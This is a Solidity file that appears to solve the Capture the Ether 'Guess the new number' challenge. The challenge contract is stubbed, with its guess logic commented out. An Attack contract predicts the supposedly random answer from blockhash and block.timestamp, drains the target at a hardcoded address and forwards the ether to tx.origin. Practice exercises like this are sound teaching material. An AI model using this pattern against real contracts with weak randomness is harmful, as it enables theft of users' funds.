pragma solidity ^0.8.4;

contract GuessTheNewNumberChallenge {
    constructor() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        // require(msg.value == 1 ether);
        // uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        // if (n == answer) {
        //     msg.sender.transfer(2 ether);
        // }
    }
}

contract Attack {
    GuessTheNewNumberChallenge victim = GuessTheNewNumberChallenge(0xD7D3Bb69DF7f1199e5492f1E9a17d0Bd3E36907D);

    constructor() payable public {}
    function attack() external payable {
  // simulate all steps the challenge contract does
  require(address(this).balance >= 1 ether, "not enough funds");
  uint8 answer = uint8(uint256(
    keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
  ));
  victim.guess{value: 1 ether}(answer);

  require(victim.isComplete(), "challenge not completed");
  // return all of it to EOA
  payable(tx.origin).transfer(address(this).balance);
  
}
receive() external payable{}
}